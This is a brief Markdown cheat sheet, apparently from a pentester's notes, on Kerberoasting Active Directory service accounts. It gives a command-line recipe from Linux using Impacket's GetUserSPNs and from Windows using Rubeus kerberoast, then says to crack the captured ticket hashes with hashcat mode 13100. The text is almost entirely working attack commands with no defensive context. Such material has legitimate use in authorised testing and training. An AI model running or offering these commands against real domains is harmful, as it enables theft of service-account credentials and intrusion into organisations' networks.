---
id: Kerberoasting
aliases:
  - Kerberoasting
tags:
  - windows
  - AD
  - passwords
  - pivoting
  - kerberos
---
## From Linux

1. Use Impacket's GetUserSPNs script:
```bash
GetUserSPNs.py -dc-ip "$DC_IP" -request -outputfile "$OUTFILE" "$DOMAIN/$USER"
```

2. Crack with hashcat mode 13100

## From Windows

1. Use Rubeus with kerberoast:
```powershell
.\Rubeus.exe kerberoast /nowrap
```

2. Crack with hashcat mode 13100
